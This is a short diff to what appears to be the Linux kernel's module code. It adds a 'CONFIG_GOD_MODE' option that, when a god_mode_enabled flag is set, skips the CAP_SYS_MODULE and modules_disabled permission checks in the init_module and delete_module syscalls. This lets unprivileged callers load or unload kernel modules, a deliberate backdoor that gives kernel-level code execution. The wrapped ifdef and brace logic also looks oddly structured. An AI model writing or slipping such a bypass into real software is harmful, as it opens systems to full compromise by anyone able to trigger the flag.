@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
    Copyright (C) 2002 Richard Henderson
    Copyright (C) 2001 Rusty Russell, 2002, 2010 Rusty Russell IBM.
@@ -779,7 +782,15 @@ SYSCALL_DEFINE2(delete_module, const char __user *, name_user,
 	int ret, forced = 0;
 
 	if (!capable(CAP_SYS_MODULE) || modules_disabled)
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (strncpy_from_user(name, name_user, MODULE_NAME_LEN-1) < 0)
 		return -EFAULT;
@@ -2913,7 +2924,15 @@ SYSCALL_DEFINE3(init_module, void __user *, umod,
 
 	/* Must have permission */
 	if (!capable(CAP_SYS_MODULE) || modules_disabled)
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	/* Do all the hard work */
 	mod = load_module(umod, len, uargs);
